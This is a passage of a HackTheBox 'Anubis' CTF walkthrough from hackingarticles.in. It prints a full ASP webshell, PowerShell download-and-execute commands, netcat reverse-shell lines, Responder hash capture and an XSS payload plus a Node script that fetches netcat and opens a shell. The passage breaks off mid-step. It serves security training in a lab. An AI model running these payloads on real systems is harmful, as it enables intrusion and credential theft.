@@ -1,0 +1,267 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Anubis HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/anubis-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2022-02-04T19:16:52+00:00">February 4, 2022</time><time class="updated" datetime="2025-06-10T20:17:50+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Anubis is an “insane” level CTF box available on the HackTheBox platform designed by 4ndr34z. The box covers a real-life scenario of initial exploitation by uploading ASP webshell, breaking out of the container and then exploiting XSS in jamovi to gain user’s account and finally targeting ADCS (Active Directory Certificate Service) for privilege escalation. It is not recommended for beginners and the article shall cover various advanced aspects of exploitation.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Directory/File Enumeration</span></li>
+<li><span style="color: #000000;">Contact page with VBScript injection</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">ASP Webshell on contact page</span></li>
+<li><span style="color: #000000;">Breaking Out of a Windows Container</span></li>
+<li><span style="color: #000000;">CVE-2021-28079 – Jamovi &lt;= 1.16.18 Cross-Site Scripting Vulnerability</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">ADCS Domain Escalation (Certified Pre-Owned research paper)</span></li>
+<li><span style="color: #000000;">Reconfiguring Web template</span></li>
+<li><span style="color: #000000;">Enroll Administrator to get a certificate</span></li>
+<li><span style="color: #000000;">Using Rubeus to reveal Administrator’s NTLM hash</span></li>
+<li><span style="color: #000000;">Reading congratulatory root flag</span></li>
+</ul>
+<p><span style="color: #000000;">Let’s begin</span></p>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">The IP assigned to this machine was 10.129.95.208. Nmap scan showed a website running on port 443. We added the common name as mentioned on the SSL certificate of the website in our hosts file for DNS routing.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -sC -Pn 10.129.95.208
+echo "10.129.95.208   www.windcorp.htb" &gt;&gt; /etc/hosts</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgtJ2SKTXnsJZTmjHb4s0nhXGR8nM6F8uVBnfXZJtMX87pU1asuxDtO00Cm-wDZfZWUxaemiHJg0YW_nxheQsry_DR8ecew3x45aEQInSzUi9Q0890jFnzJccTCcnTbShhRTK4A7S7fx09SC21y-OmhGBWQJpF6b6CFGwBWykblBCtijAbiS-y0GlrOJA=s16000"/></span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">Upon enumerating the directories, we couldn’t find anything interesting except the fact that pages ended in *.asp which meant that there was a windows server running in the background. A deeper enumeration led us to the contact page which reflected whatever I input as text. So, I tried to input a basic VBScript in message body which is supposed to change the cookie name to Harshit.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh_jK1-hlKWPaX3i166YGMenDrMw655iQQXZOkZBzGEBqeznRJyMoivhSIoIXEO_RxXQWHlbNWkn1Qu40BewbZf53lc8-3D25mOs3xQEEZIojbYE3dzMJJYZV2FeXpFtt6l_2tKXm3ZUajciMgp2zL84e9iRDupNgEZokOre0dp-fMZjGv-xmt_efvHjQ=s16000"/></span></p>
+<p><span style="color: #000000;">To our surprise, the server tried to write a cookie. Of course, it threw an error but this opened up the scope for exploitation.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj57xTX0LQd6bjV8nSFj6_Je9DWPmOYssExY8MQww-Y7u38kwx_JXthF-44pEcg7-V0CiTf2LJkgNEPZ7a-wSWYrGtxvsFQdsyE0x_i6zsPDeZCXFfPediPG_IVs9PthHMBdRrBCnjWrvSD1DZN6soGaRQ1qu133FfKDWx8XSPRP3xFHLUqcgea6mcsYA=s16000"/></span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">Kali comes with a great ASP webshell located at /usr/share/webshells/asp  /cmdasp.asp which we sanitized a bit and then uploaded on the server. You can find the sanitized version down below</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;%
+  Dim oScript
+  Dim oScriptNet
+  Dim oFileSys, oFile
+  Dim szCMD, szTempFile
+
+  On Error Resume Next
+
+  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
+  Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
+  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
+
+  szCMD = Request.Form(".CMD")
+  If (szCMD &lt;&gt; "") Then
+    szTempFile = "C:\" &amp; oFileSys.GetTempName( )
+    Call oScript.Run ("cmd.exe /c " &amp; szCMD &amp; " &gt; " &amp; szTempFile, 0, True)
+    Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
+  End If
+
+%&gt;
+&lt;FORM action="&lt;%= Request.ServerVariables("URL") %&gt;" method="POST"&gt;
+&lt;input type=text name=".CMD" size=45 value="&lt;%= szCMD %&gt;"&gt;
+&lt;input type=submit value="Run"&gt;
+&lt;/FORM&gt;
+&lt;PRE&gt;
+&lt;%
+  If (IsObject(oFile)) Then
+    On Error Resume Next
+    Response.Write Server.HTMLEncode(oFile.ReadAll)
+    oFile.Close
+    Call oFileSys.DeleteFile(szTempFile, True)
+  End If
+%&gt;</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgvZhVKYhjkVm0Pd3Ur4hkqJL0RHTOsY8OSlcM-PZY6TCbieyz4TjPmxa_TJ04IDLHBC0rGb0m4Ig1MnTWN5bSnrj71CFy-a3Olq7aAsJbKzCwd7dLxNreCzqnbL0blaG4XdKr2_hw515yft9W5FuwwFmISTZCYit4_-eMwv29gTagu8Z1ykIpuqSOrLA=s16000"/></span></p>
+<p><span style="color: #000000;">Upon inserting this via contact page we see we have now converted this into an RCE vulnerability. We test out this by running a simple whoami</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhQOI73EmaTJozTt68BB9MlfROMUgRUhAeBN6eWaOoI7AQGAcqaklJD8a1MRFG8oqhMsq_d8u51htYP9XI0uvbBFUDIYiiLVJrO9dSI52Kbi_VqlUq91VvyhMZemtPmPzh91WG5fNbooHBgonH-T6NwLo0tDGyt41aAhWhu3KGHe0sPMrwZMddG_EjOQw=s16000"/></span></p>
+<h4><span style="color: #000000;">Exploiting the System</span></h4>
+<p><span style="color: #000000;">The plan to exploit this system was to upload a Windows netcat executable by delivering it through python web server and running a powershell invoke web string (alternate to wget in windows) command to download and start it. You can download nc64.exe <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/int0x33/nc.exe/blob/master/nc64.exe">here</a></span></strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 -m http.server 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjJw2q-VWPo3WYIV5pAnRwcaziBfrzpgQLeWD0EmvdZYkpu_ITSuRrbvNpm7p4Mh-xVFejpMHYo1KFVd_g6Fps5j7XWGBLKVHVtclqa5TBF8plwSJCVIrbW1UxOdLHW9IT5d_bdh2LCMCiTUwIWeJxOhjqBBu9Ct46TLmupi9z7EawXWf5leTivNIucvA=s16000"/></span></p>
+<p><span style="color: #000000;">On the receiving end, we type the following powershell one-liner to save this exe on victim Desktop</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -c iwr http://10.10.16.3/nc64.exe -outf \Users\Administrator\Desktop\nc64.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgOaJQ8ZlnTp1SQM0Dc2YYuynWyN12dR2swgQRnKh-0ft_zwz9ibPOTfNxeBJlqdumv20sO_vTdMSt9YbotM_8APz4FAI7UYwMMveyqg38HX9yYGyxu0YdNrgqgY7ZMMfc02PlnPTk7K6m0MlzZsr5h14bYM6RYJQd6efck1HiakgW9RuMfr3wj4_ybVw=s16000"/></span></p>
+<p><span style="color: #000000;">And then finally we set up our listener on port 1337, start nc64.exe using powershell and as you can see we received a reverse shell!</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">start \Users\Administrator\Desktop\nc64.exe 10.10.16.3 1337 -e cmd.exe
+nc -nlvp 1337</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjbNUcI3JohTNC5OCON82Co3CihejLjzjyV_KDfj_3ojwa12sj5AEsHepHoLYyx8n2JHe5NYQTdhzNEclpEZYEX2zy9n2FxERKP7_0Y5btZLCz3hJXzehWSdWUcYi-MexJ7Fk2V4vN5ha-tF3lAXZ3k22U6Su_JhpJXz8__FBjcEJJjTuZDcEpjcUfl4g=s16000"/></span></p>
+<p><span style="color: #000000;">Upon running whoami we see that we have Administrator access. The excitement was short lived as upon checking C:\users directory we see that we are in a container currently.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgZey0-uJi-doxa3nzM0M6zEH67pSgLnXVfLI8FjTBknHTBYx6fZdcMN-cbZMOuHlKiKsDoZU7iql2HDL4DfwxNctZyvJbSZ4CGIDB9zlC-HT11W3jXTFjaImuiwKtkHhksoe-_n30758uYqcEr6_fX5eq_Y_72cCgFc8sS-YricWEjfW2AxXgCpChuOg=s16000"/></span></p>
+<h4><span style="color: #000000;">Escalating Privileges</span></h4>
+<p><span style="color: #000000;">If our experience has taught us anything it’s that to break out of a container, we need a blunder by the admin in terms of configuration or casualness in leaving sensitive documents around. So, we looked for such documents and observed a req.txt on Desktop which was a certificate export.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjsaEK6Dzt-cGtHa3tWl3c8_mLVrtgjMgvgMp37DH1hZ_NSL5el9yYl2XGDNVeRtS-babRgbkc6Eom7ENlNPAxbPM2JfIqB0JwVifKk5iwvCh8i088Tw1_tatnSrGFvz-Qy2NTPQ9ZjPDxIx-4Avvz2hzJBYd6-FmiaXdWf14COfBP9ZP5KaxGaFmu7wg=s16000"/></span></p>
+<p><span style="color: #000000;">We copied this to our local system and deciphered it using openssl command</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl req -in req.txt -text</pre>
+<p><span style="color: #000000;">We discovered a Common Name parameter (CN) set as softwareportal.windcorp.htb</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjoGAqHNTjubkntH0r7oyCRjqbAWc4mKVTlgdwi_65QVE4jnADowO4YX2-gjLNtSMGJhvl43Rk4TpZYG_i2Ra2qTL1DqYHG52wMTOwwBYengODxHPb5S8USvFzkuxxCje_JjYxk5P-k87PqLgp-l_yj6FM94-1Ae3W81l1sLXyfwwEJj8jtRYRehf9h6Q=s16000"/></span></p>
+<p><span style="color: #000000;">This CN was interesting as in our enumeration we didn’t find this subdomain. So, we added this subdomain in our hosts file too but still it wasn’t reachable by my machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiA0Gdw1Hs5ZxUq-dMxF6pvB8qXB6UFBMa1JGKPDWJ4bvuVV79kYN0xM30-JxS9PgjGnYKo8XIZK8ujwHwGSjZbSs3zNv7nKneZA-I2377bekQD-MxH0CbTFB0dD2wratHX7owcXG3h9APNIfebH-BEuXbVivU3is1wyA2RNDgC-1dbdWcoKcirPpQfvA=s16000"/></span></p>
+<h4><span style="color: #000000;">Creating a Tunnel and Accessing Internal Websites</span></h4>
+<p><span style="color: #000000;">It was safe to conclude that this was an internal website running within the container and we needed to create a tunnel to reach it. We used <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/jpillora/chisel">chisel</a> </strong></span>to do this. We downloaded the windows binary and started a python server</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjVlsqK75dwPSutfUlqLDkz1CRe_YvVi5ArNQzbmoTEGVwW87hIe1_zOdSqHgk-5HrBfF4BkRgtL6Qttgr9facpDHbJoTp54NcqQUTfce0tSg1tK6rPsh0xVhwSSbiaXqyGEYcp8kphiuf-86k8qJTjAWvlDUmFazM4WTamqIPPUNKMMAwZSNYZ8tAcdQ=s16000"/></span></p>
+<p><span style="color: #000000;">In the victim’s machine, we used curl to download this to the desktop</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl http://10.10.16.3/chisel.exe -outfile chisel.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjj6t52wlope9aZdP7Xp6XMUqzT4IOyDThBFJbHe7yzr2aJF7DQVcggsU1YQ-Gb9B2oVhOL9qmSXlSbf0VBm2mxo-EbEXvdw7E-JdyydmGmk0Mm6rGe8OXLfRFlOb-22HCG8mdBSoysa4cXSfkoxJeMpA3iN1hmU1iZlyBVh37n4E5zkkq6OZ4oSMpfYg=s16000"/></span></p>
+<p><span style="color: #000000;">We can install chisel in our kali using the apt package manager. Then we need to start a server.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install chisel
+chisel server -p 8001 --reverse</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg4i1__w0my08e12g-KKOk0DcRMwueDuZPoy62WT8YNLD1H7ib6tCU7IATTsB_VSmwRv-UcpvruZuhoL2pSbq8wCSY3IWwi-wmDGkVOruxNlFGE4OXurlWMZAxIDfV4voOfGTQnrJnjW1AxME_exNvHesAFxmWvocADGBZTk4vPlJ8p4H6laLAC6S88mQ=s16000"/></span></p>
+<p><span style="color: #000000;">In our victim’s box, we need to connect chisel in client mode to this server</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">.\chisel.exe client 10.10.16.3:8001 R:socks</pre>
+<p><span style="color: #000000;">As you can see chisel is now connected to this server</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhK-m9mVf3MCC0VTZKWNXVISYsX7Y8fO1HFZuVoa8HaoD-BMbBD2WUwsfu34ifNm6uu8MzqiU7rPWexBCje0q9MeAS9GNmP0wdKmMQV-aGDbrsRj7Tim9l-UTqdP0rMOnOxVD03ZNflZbbk1tnA2jFaUYMHe1DHCiO5dNZvwZXkL3pvRSu_vveyPTnSfw=s16000"/></span></p>
+<p><span style="color: #000000;">In our server, we saw port 1080 being used as the tunnel.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjpStKTJwd4qEk_sXOWyXzDNnutO1HJdH2Z8BaPx96_mKZMtl-kJm0mRQ0iPDT75uq2QTFnFGbvAkurTpjB3ChU1ZhlrN5N4cPjdFWI95e-ISWfd_ELYkzM6D1z3O_OM1XTtTfF3Bux_YFQm2y5612eofnwNW3ZP0VhwTBc0qKUP0oeJSA7lU7v8fdcxg=s16000"/></span></p>
+<p><span style="color: #000000;">By default, chisel uses socks5 proxy. So, we head over to proxychains.conf file and add this IP and port as a socks5 tunnel. Note that proxychains is preinstalled in kali but can be installed using apt. I commented out the socks4 line since I don’t want to use socks4.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjLo0KtGL_zYAAUy1pI3k-4froQR4Izo_NlfiyqumjxWjypO-jB5CuuROwwGy4e3Dje2kqo9sq4c7dgc9XG6q0ZNhMIOf9EBKStLBNnEWroKw5BqL4xwBn80vr4pz2oWY-wutCcRAxtToOWaHLHIIPyrADZ0ssnI9moU11JM4wyIyHjEeHhEt-ZqNbwMQ=s16000"/></span></p>
+<p><span style="color: #000000;">Also, in our victim machine, we noted the default gateway of the container as 172.22.32.1</span></p>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgEQsV6I9kqTC-BQoazZf6iLcmDjA6zABZ-RKCSPAhV38-mR6yytdut_eAh6OaMQkEuROxnEEiQuFQOvnJT9S2KGZv12i1_QREPRFvTkE7GOPWxKFozr0LoQr9z98sQ3to2TX6XLp5uCg4iH6YMcQJvPxYlpbsZyvOvFV_z3nvmk-mLNZ9C3vDn10Rv4A=s16000"/></strong></span></p>
+<p><span style="color: #000000;">Because the softwareportal webpage is in the container, we need to add this entry in our hosts file to make our system resolve the name.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhmZPVvwtiiRtzUvRhNDt_K0aBqjxMRbCui0MAJeajP291wxPpGGlB0QsG2nwCZ_a8pEFJao6Wfsr9vpyEnWKwC8s--KaNfjuqaZzHxFA6lPjZrQW0m13wzY6KNAeDC1dkmTguCBoAmClniziN3IAtwZ2FySdke0X-U-Fzsm7zYQP6lvIcVnDDHnbyspQ=s16000"/></span></p>
+<p><span style="color: #000000;">After that, we can curl this webpage and as you can see, we were successful.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">proxychains curl http://softwareportal.windcorp.htb</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgQbIWk-ndlMtX3oW0AA9d7W4ih7pAx2mlnaJ3BnajL7NL5WC0_AEnK_DFc9ENtpAowLNOv7YIuS1bIe7rOVfoDxBPf6H6nV2aKlRBJRcHtbN0MfDd2uAPnJ8WEMTW73gBfUo_kEwIMw27WUzKCe5EaxMDyvIqAXAM1LtmXo3Mn_yC8MDCQ2xwW2elVJA=s16000"/></span></p>
+<h4><span style="color: #000000;">Poisoning Requests and Capturing Hashes</span></h4>
+<p><span style="color: #000000;">Upon perusing web page’s code in the terminal, we found out that the webpage install.asp had a WinRM implementation that tries to install a particular software in the IP specified.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgfSf9kyJBWITLcoprN6LR2VtLxrj8kKwjEqyYJsV7tuYGr4s8w7gks1jtXFmXhznflMDEDp_8wTK7r4dB3Z2R8f66mUXPsKTpK07qoGf7CzODTUh6uo5WGmo0dcyNX1AUTlde25CMxZKHMMKROSGnhHhE7CMC3-9CXmuAvTHjdsqhqpFPG8XCFjZV7jg=s16000"/></span></p>
+<p><span style="color: #000000;">What’s noteworthy here is that, when a server resolves a system within a domain forest, it authenticates it first. This means that we can poison this request using the responder and capture the NTLM hash of the user performing this function. For that, we set up a responder listener</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">responder -I tun0</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgbSGLS14ueZYCiUABjS-YZQHv0tS1RtWkVNs1EgWZFeWFxjVUFMP97JkQRqdwP0MfpxV867wFiXgQrWvD6DDb8V32tQP1UMz61guWEeEF3244vSuwdOjwYZ8uh-b-tT22or8KCR3ogi9b1VbaCGcVIo5XO4g5UlMbSZ0fj1aWPtx2qJyi5pRhzsvPu-g=s16000"/></span></p>
+<p><span style="color: #000000;">Now, we will switch the client IP in that URL with my own IP and send a request to it using curl.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">proxychains curl http://softwareportal.windcorp.htb/install.asp?client=10.10.16.3&amp;software=VNC-Viewer-6.20.529-Windows.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgmZbTRIFhZEtGsxgOSdKp2iYolrYh0A1nH8eTauYYC5uAWelOPJtezYW9_kz_LCtqHDuJBFwUdNWoM4jxBD-pjUs3i2fsf0RC1GYzCZam3XT505H1nHDuy7cJLGtVvomAYxuuTIQ7FmQvkARco2HtLFgXtBjlLR_DtuC_9K-f4OGxY0s2IuAdvBbZoeg=s16000"/></span></p>
+<p><span style="color: #000000;">In our responder we can see we were able to capture NTLMv2 hash of the user localadmin. That’s a positive sign.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgz2rj5kmkWEqKi7LX7AHVEINCa-xZHBpRHyNuTvJT9c3qcvE0T3LSaUlVjfKsobWO2SnMhDM9l9_D-9LjmoouYExNf8O2S40BOMkRLJFY8rIbWzip73IvRqOiFZE9fQD37B61iYXLdmnlx2TGVQkfN-KjXKzTODkchvXZ8KsxX3R3znVETTPyzZkoV8w=s16000"/></span></p>
+<p><span style="color: #000000;">We copy this in a file and try to crack it using john and wordlist rockyou.txt. With some luck we managed to find a password from within this file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjvHhVrLMtrFRtWDpgPBYl9cx4FrsA9j1D-H7ay8E-b6SK3nTNk8EX3K2O5C60EYSwVidrHmpnI24gKATAnDOMy1OMCPBj19kVtV0FEr_ygYcG06CuWugXYGkS3G0FlS2_au97pUuRpBy7_MdQs9uCr3YV1WVvvXhPI9rPG9bHgSWS1ccUPiL4dQEt7jw=s16000"/></span></p>
+<h4><span style="color: #000000;">SMB Shares and Jamovi Exploitation</span></h4>
+<p><span style="color: #000000;">Since there were no SSH or similar services running, we used this credential to check SMB shares.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbmap -H 10.129.95.208 -u localadmin -p Secret123
+smbmap -H 10.129.95.208 -u localadmin -p Secret123 -R Shared</pre>
+<p><span style="color: #000000;">We observed 3 important things here. First, CertEnroll share was made which could mean that a certificate authentication service was running. Second, a share called “Shared” was accessible by this user and third, jamovi installation was there on the system.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjCSmdj-KorlErBh-GlPguc1m0tclgbwtINXmkzDEOJgk0Oj8MaqBeRfKil1jqMYz87QBF5Tju4TFj3ekavGTf0IHWipgr38dWGw-rUeInC4Q_TIY5MxahXs0nyEmOIQLYO5ypKuYLGfbjIVAsxrcEYdHHH41BezThNNi8Eyb399O8B-ChDeyh8RCEVgw=s16000"/></span></p>
+<h4><span style="color: #000000;">Identifying Jamovi Vulnerability</span></h4>
+<p><span style="color: #000000;">We put our very safe bets on exploiting jamovi for further privilege escalation as the author <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/theart42/cves/tree/master/CVE-2021-28079">4ndr34z</a> </strong></span>had recently found out an XSS vulnerability in Jamovi &lt;=1.6.18 (CVE 2021-28079).</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi8D0iijdvvHbuiIzTEjQ5o4701ojKyzeCZDiXwW6Gsc6d1BDVFV-q-pC-vsIq_WZD-4QQdA8XHwF89W_X8_vhihSV3AJ9RmlhR22_607pZM-16qLVOCfVZ25-HhIuSDIkWv8CAqgZg7cTQH2M0ierglSA_AT8XuplrdooA9iaDpfOATseIHQ3jxGvxbw=s16000"/></span></p>
+<p><span style="color: #000000;">By referring to the author’s post on github and this reference video, we could input a script in the name parameter of an OMV document. Jamovi resembles any Microsoft Office document in the terms that it is an archive of multiple documents packed in *.omv extension. So, here’s what we did to exploit this:</span></p>
+<ul>
+<li><span style="color: #000000;">Download Whatif.omv, unzipping it.</span></li>
+<li><span style="color: #000000;">Injecting in the name string in metadata.json a modified script jamovi.js that downloads netcat from our server and returns a reverse shell</span></li>
+</ul>
+<h4><span style="color: #000000;">Exploiting Jamovi for Privilege Escalation</span></h4>
+<p><span style="color: #000000;">For this, we logged in the share using smbclient and traversed to the directory where jamovi analytics files was kept and downloaded Whatif.omv</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient //10.129.95.208/Shared -U localadmin</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh5T7RTbiSLkgkYrOnPS8y2C1Bww-q-OMehptEpAVdKoYRRJcNSE1vnDm6wYkSTe7GNVNL2AgBmsYLoRwYO_4ChFmH4PqO69dCN3pzIyRWtV9lZ-d39YYjq9gYZ4h0mTEI7EjdhATNx4cSHUZSeVECDkqo20vTciRMzL-ZXBWbifsuGRDtvk-i19KAdeg=s16000"/></span></p>
+<p><span style="color: #000000;">We can now unzip this omv file. As you can see there are various files in this archive.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhtkU0s0wdK_OanHCb0gk4pFlixOPRnJVnawWfidb1NzxkfFiQ72RAt_-ijFnuy85bnTcxZacumhEnxP1QaVcxyEvbsRIldFruoxtIRzy0e7EM86SLixJBbqCTiwirpTHElIhk8E4CSHKB-EMcSIeO6e1dmUu351CRlB0jiu2sp9tsu0bcz-EWjUp5fpQ=s16000"/></span></p>
+<p><span style="color: #000000;">We modified metadata.json and inserted the following code in the vulnerable “name” parameter</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;script src=http://10.10.16.3/jamovi.js&gt;&lt;/script&gt;</pre>
+<p><span style="color: #000000;">And also, we create a new JS file jamovi.js with the following code:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">const ignite = require("child_process");
+ignite.exec("powershell -c iwr http://10.10.16.3/nc64.exe -outf \\windows\\system32\\spool\\drivers\\color\\nc64.exe");
+ignite.exec("start \\windows\\system32\\spool\\drivers\\color\\nc64.exe 10.10.16.3 4444 -e cmd.exe");</pre>
+<p><span style="color: #000000;">You can refer node.js documentation on child_process and exec command <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://nodejs.org/api/child_process.html">here</a></strong></span>. Basically, this JS file will download nc64.exe from my server and run the server on port 4444.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjyxfHsAwvMCpRhuT30-3_cwyycEpjlBxG_vIhqEvrPzznwfzsQQv7jQPxPTTqdFB5ZE6x8eKrOxzcJSNYLXCk3q1tlNvwy8wltfCXBy4pzGEtjwskMcH7NEC_AnRmx-CMJvRslO_Z61kOJ8cZ_UYGn3qi8vgDJhXW277tC8bUz87oHMMhq2q9YtyDtKw=s16000"/></span></p>
+<p><span style="color: #000000;">Once the modification is done in metadata.json, you need to remove the original Whatif.omv from the folder and zip it back again like so</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">zip -r Whatif.omv *</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEii5iJKob_iPehZGFuCizYKUl3LXkmcZlWArZFYdh1woH86enjLAqXNhWZMSG0lM1yl1Fsj7HH_dtRg_8yduNrOT_dL-AC4c47cVvuvO16Oo-0VEZ2hBGEmNMGFGMbktB4xEr07tmXQccvLPEQ_Tx9RWtXFTqyV8RYH8-1VCPORNY5_iWpGMoXAfB5Omw=s16000"/></span></p>
+<p><span style="color: #000000;">Now, we place jamovi.js and nc64.exe in the same folder and launch our python server</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg8Fj3plzSOg-WY4iP4hmmT-jggBX8BNw5p70ECXNs8EFz0LqsM4hhOJbPuUPkZqV9wvjSCTZxvXBslNyEFgGnPDtkH_EPj_T8PK7keH2jNFU743wpXLvEtAyoKZ0T5tL50S-1hE68518X_4dmfr5jSkfkjSjDW46hwiULhnZhlMA42ek8ZC72m_3oU_g=s16000"/></span></p>
+<p><span style="color: #000000;">Once done, we need to manually place Whatif.omv back again in the same directory and wait for it to execute.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient //10.129.95.208/Shared -U localadmin
+del Whatif.omv
